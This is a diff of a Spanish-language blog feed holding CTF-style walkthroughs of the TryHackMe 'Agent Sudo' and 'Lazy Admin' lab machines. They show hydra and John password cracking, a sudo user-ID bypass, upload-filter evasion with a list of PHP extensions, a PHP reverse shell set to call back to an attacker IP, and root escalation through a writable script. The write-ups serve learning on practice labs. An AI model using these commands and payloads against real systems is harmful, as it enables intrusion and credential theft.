+p1 = log.progress(&amp;quot;Trying with Agent&amp;quot;)
+p2 = log.progress(&amp;quot;Agents with different response&amp;quot;)
+
+for i in characters:
+    headers = {
+        &#39;User-Agent&#39;: i
+    }
+
+    response = requests.get(main_url, headers=headers)
+    p1.status(i)
+    if response.text != standard.text:
+        different += &amp;quot; {},&amp;quot;.format(i) 
+        p2.status(different)
+        f = open (&#39;agent_{}.txt&#39;.format(i) ,&#39;w&#39;)
+        f.write(response.text)
+        print(&amp;quot;\n[*] Result saved on agent_{}.txt&amp;quot;.format(i))
+        f.close()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ python3 script.py
+[*] Trying with Agent: Z
+[*] Agents with different response:  C, R,
+
+[*] Result saved on agent_C.txt
+
+[*] Result saved on agent_R.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dentro del agente_C.txt hay el siguiente mensaje&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;¿Todavía recuerdas nuestro trato? Por favor, dígale al agente J sobre las cosas lo antes posible. Además, cambia tu maldita contraseña, ¡es débil!&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Como dice que su contraseña es débil con hydra vamos a intentar encontrarla usando un diccionario.&lt;/p&gt;
+&lt;p&gt;Hydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-l&lt;/td&gt;
+&lt;td&gt;Usuario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-P&lt;/td&gt;
+&lt;td&gt;Diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-t&lt;/td&gt;
+&lt;td&gt;Velocidad&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;h3 id=&#34;puerto-21&#34;&gt;Puerto 21&lt;/h3&gt;
+&lt;p&gt;El hydra encuentra la contraseña y ya podemos conectarnos por ftp como chris, dentro hay 3 archivos: To_agentJ.txt, cute-alien.jpg y cutie.png. Con &lt;code&gt;get archivo&lt;/code&gt; nos los podemos pasar a nuestra máquina.&lt;/p&gt;
+&lt;p&gt;Contenido de To_agentJ.txt&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Dear agent J,&lt;/p&gt;
+&lt;p&gt;All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&amp;rsquo;t be a problem for you.&lt;/p&gt;
+&lt;p&gt;From,
+Agent C&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;Estimado agente J,&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;¡Todas estas fotos alienígenas son falsas! El Agente R almacenó la imagen real dentro de su directorio. Su contraseña de inicio de sesión se almacena de alguna manera en la imagen falsa. No debería ser un problema para ti.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;De,&lt;/em&gt;
+&lt;em&gt;Agente C&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;cute-alienjpg&#34;&gt;cute-alien.jpg&lt;/h3&gt;
+&lt;p&gt;El Agente C dice que dentro de esta foto hay la contraseña de inicio de session del Agente J. Con steghide podemos intentar ver su contenido&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ steghide extract -sf cute-alien.jpg
+Anotar salvoconducto: 
+steghide: �no pude extraer ning�n dato con ese salvoconducto!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: &lt;a class=&#34;link&#34; href=&#34;https://github.com/RickdeJager/stegseek&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/RickdeJager/stegseek&lt;/a&gt; para atraves de un diccionario poder conseguir el contenido oculto de la foto.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &amp;quot;Area51&amp;quot;           
+[i] Original filename: &amp;quot;message.txt&amp;quot;.
+[i] Extracting to &amp;quot;cute-alien.jpg.out&amp;quot;.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;messagetxt&#34;&gt;message.txt&lt;/h4&gt;
+&lt;p&gt;Contenido del archivo message.txt renombrado a cute-alien.jpg.out&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Hi james,&lt;/p&gt;
+&lt;p&gt;Glad you find this message. Your login password is censored!&lt;/p&gt;
+&lt;p&gt;Don&amp;rsquo;t ask me why the password look cheesy, ask agent R who set this password for you.&lt;/p&gt;
+&lt;p&gt;Your buddy,
+chris&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;Hola James,&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Me alegro de que encuentres este mensaje. ¡Su contraseña de inicio de sesión es censurado!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;No me pregunte por qué la contraseña parece cursi, pregúntele al agente R quién estableció esta contraseña para usted.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Tu amigo,&lt;/em&gt;
+&lt;em&gt;cris&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;puerto-22&#34;&gt;Puerto 22&lt;/h3&gt;
+&lt;p&gt;Ahora ya tenemos las credenciales de james y nos podemos conectar por ssh&lt;/p&gt;
+&lt;p&gt;Ya podemos ver la flag de user.txt&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;con &lt;code&gt;sudo -l&lt;/code&gt; podemos ver que puede ejecutar como root&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;james@agent-sudo:~$ sudo -l
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;E buscado el &lt;code&gt;(ALL, !root) /bin/bash&lt;/code&gt; en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;james@agent-sudo:~$ sudo --version
+Sudo version 1.8.21p2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En el exploit (&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/47502&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.exploit-db.com/exploits/47502&lt;/a&gt;) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -u#-1 /bin/bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;De echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Lazy admin</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/</link>
+        <pubDate>Wed, 14 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/1.jpg" alt="Featured image of post Resolución Lazy admin" /&gt;&lt;p&gt;Máquina fácil Linux para practicar tus habilidades.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/lazyadmin&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/lazyadmin&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.192.128&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.192.128
+PING 10.10.192.128 (10.10.192.128) 56(84) bytes of data.
+64 bytes from 10.10.192.128: icmp_seq=1 ttl=63 time=66.1 ms
+
+--- 10.10.192.128 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 66.057/66.057/66.057/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.192.128 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPorts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.29.188
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p22,80 -sC -sV 10.10.192.128 -Pn target
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 497cf741104373da2ce63s89586f8e0f0 (RSA)
+|   256 2fd7c44ce81b5sa9044dfc0638c72ae55 (ECDSA)
+|_  256 6184622s7c6c32917dd27459e29cb905e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p22,80&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h3&gt;
+&lt;p&gt;Al entrar a la web lo primero que se ve es lo siguiente&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web.png&#34;
+	width=&#34;1394&#34;
+	height=&#34;914&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;366px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h4&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=======================================================================
+ID           Response   Lines    Word       Chars       Payload                         
+=======================================================================
+
+000000075:   301        9 L      28 W       316 Ch      &amp;quot;content&amp;quot;
+000095524:   403        9 L      28 W       278 Ch      &amp;quot;server-status&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Dentro de /content solo hay un texto&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content.png&#34;
+	width=&#34;723&#34;
+	height=&#34;228&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;317&#34;
+		data-flex-basis=&#34;761px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Traducción: &lt;em&gt;Bienvenido a SweetRice - Gracias por instalar SweetRice como su sistema de administración de sitios web. Este sitio se está construyendo ahora, por favor llegue tarde. Si usted es el webmaster, vaya a Dashboard -&amp;gt; General -&amp;gt; Configuración del sitio web y desmarque la casilla de verificación &amp;ldquo;Cerrar sitio&amp;rdquo; para abrir su sitio web. Más ayuda en Consejo para Basic CMS SweetRice instalado&lt;/em&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios-en-content&#34;&gt;Buscando subdirectorios en /content/&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.192.128/content/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;=====================================================================
+ID           Response   Lines    Word       Chars       Payload                         
+=====================================================================
+
+000000016:   301        9 L      28 W       323 Ch      &amp;quot;images&amp;quot;
+000000953:   301        9 L      28 W       319 Ch      &amp;quot;js&amp;quot;
+000002190:   301        9 L      28 W       320 Ch      &amp;quot;inc&amp;quot;                           
+000003320:   301        9 L      28 W       319 Ch      &amp;quot;as&amp;quot;                            
+000003601:   301        9 L      28 W       324 Ch      &amp;quot;_themes&amp;quot;                       
+000003808:   301        9 L      28 W       327 Ch      &amp;quot;attachment&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;credenciales-inicio-session&#34;&gt;Credenciales Inicio Session&lt;/h2&gt;
+&lt;p&gt;Dentro del &lt;code&gt;/inc&lt;/code&gt; hay una carpeta llamada &lt;code&gt;mysql_backup/&lt;/code&gt; dentro hay un archivo llamado &lt;code&gt;mysql_bakup_20191129023059-1.5.1.sql&lt;/code&gt; nos lo descargamos, dentro se puede ver un usuario llamado &lt;code&gt;manager&lt;/code&gt; con un hash &lt;code&gt;--------------&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ hash-identifier --------------
+Possible Hashs:
+[+] MD5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para ver el contenido vamos a usar John the Ripper&lt;/p&gt;
+&lt;p&gt;John The Ripper es una herramienta de código abierto para la recuperación y auditoría de seguridad en contraseñas, además de ser multiplataforma, es el más utilizado y versátil, ya que combina una velocidad de “craqueo” rápida, con una extraordinaria gama de tipos de hash compatibles.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+
+Password Censurada      (?)     
+
+1g 0:00:00:00 DONE (2022-12-14 21:28) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s 062089..redlips
+Session completed.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya podemos iniciar sessión en el panel de login que está en /content/as&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login.png&#34;
+	width=&#34;475&#34;
+	height=&#34;552&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;86&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Con esto entramos a un directorio que parece ser el panel de control del administrador, hay muchos apartados, pero hay uno (&lt;code&gt;media center&lt;/code&gt;) En el cual podemos subir archivos.&lt;/p&gt;
+&lt;h2 id=&#34;reverse-shell&#34;&gt;Reverse shell&lt;/h2&gt;
+&lt;p&gt;Vamos a intentar subir un archivo.php malicioso echo por pentestmonkey para crear una reverse shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Importante cambiar esto con la ip de nuestra máquina y el puerto en el que vamos a estar en escucha&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$ip = &#39;10.10.10.10&#39;;  // CHANGE THIS
+$port = 443;       // CHANGE THIS
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya lo podemos subir&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php.png&#34;
+	width=&#34;700&#34;
+	height=&#34;37&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1891&#34;
+		data-flex-basis=&#34;4540px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;No se ha subido, puede ser que al ser .php lo haya bloqueado&amp;hellip; En estas situaciones, se puede intentar con extensiones menos típicas de php que el admin no haya bloqueado.&lt;/p&gt;
+&lt;p&gt;Ejemplos de alternativas a .php: &lt;code&gt;.php2&lt;/code&gt;, &lt;code&gt;.php3&lt;/code&gt;, &lt;code&gt;.php4&lt;/code&gt;, &lt;code&gt;.php5&lt;/code&gt;, &lt;code&gt;.php6&lt;/code&gt;, &lt;code&gt;.php7&lt;/code&gt;, &lt;code&gt;.phps&lt;/code&gt;, &lt;code&gt;.phps&lt;/code&gt;, &lt;code&gt;.pht&lt;/code&gt;, &lt;code&gt;.phtm&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.pgif&lt;/code&gt;, &lt;code&gt;.shtml&lt;/code&gt;, &lt;code&gt;.htaccess&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;, &lt;code&gt;.inc&lt;/code&gt;, &lt;code&gt;.hphp&lt;/code&gt;, &lt;code&gt;.ctp&lt;/code&gt;, &lt;code&gt;.module&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Primero vamos a probar con &lt;code&gt;.phtml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml.png&#34;
+	width=&#34;1665&#34;
+	height=&#34;92&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1809&#34;
+		data-flex-basis=&#34;4343px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;¡Ahora si!&lt;/p&gt;
+&lt;p&gt;Nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Clicamos el archivo que hemos subido anteriormente a la web y recibimos la conexión&lt;/p&gt;
+&lt;h2 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h2&gt;
+&lt;p&gt;Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty&amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; se puede ver que podemos ejecutar &lt;code&gt;/usr/bin/perl&lt;/code&gt; y &lt;code&gt;/home/itguy/backup.pl&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Si vamos al &lt;code&gt;/home/itguy/&lt;/code&gt;, y hacemos un cat a &lt;code&gt;backup.pl&lt;/code&gt; se ve que ejecuta un archivo que está en &lt;code&gt;/etc/copy.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;(Contenido backup.pl)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/usr/bin/perl
+
+system(&amp;quot;sh&amp;quot;, &amp;quot;/etc/copy.sh&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este archivo no tenemos permisos de escritura, pero en el copy.sh sí. Vamos a hacer una prueba para ver si lo que ponemos en copy.sh se ejecuta como root&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;www-data@THM-Chal:/$ echo &amp;quot;whoami&amp;quot; &amp;gt; /etc/copy.sh
+www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Efectivamente se ejecuta como root, ahora vamos a decirle al copy.sh que spawnee una bash&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;www-data@THM-Chal:/$ echo &amp;quot;/bin/bash -i&amp;quot; &amp;gt; /etc/copy.sh
+www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl
+root@THM-Chal:/#
+&lt;/code&gt;&lt;/pre&gt;
